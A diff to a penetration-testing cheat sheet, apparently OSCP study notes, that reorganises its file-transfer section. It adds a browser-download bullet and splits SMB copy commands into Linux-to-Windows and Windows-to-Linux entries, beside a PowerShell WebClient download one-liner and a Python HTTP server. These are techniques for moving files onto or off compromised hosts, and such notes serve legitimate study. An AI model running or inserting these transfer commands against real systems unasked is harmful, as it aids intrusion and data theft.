@@ -943,6 +943,8 @@
 ## FILE TRANSFER
 - [Transferring Files to Windows](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)
 - [Transferring Files to Linux](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files.html)
+- Browser
+  - Navigate to the file on the site and download it directly
 - Linux
   - PYTHON (HTTP)
     - `python -m SimpleHTTPServer <PORT>`
@@ -974,8 +976,10 @@
     - `ftp -v -n -s:ftp.txt`
 
   - SMB
-    - `copy \\<IP>\<PATH>\<FILE> # Linux -> Windows`
-    - `copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux`
+    - Linux -> Windows
+      - `copy \\<IP>\<PATH>\<FILE>`
+    - Windows -> Linux
+      - `copy <FILE> \\<IP>\<PATH>\`
 
   - Powershell
     - `powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')`
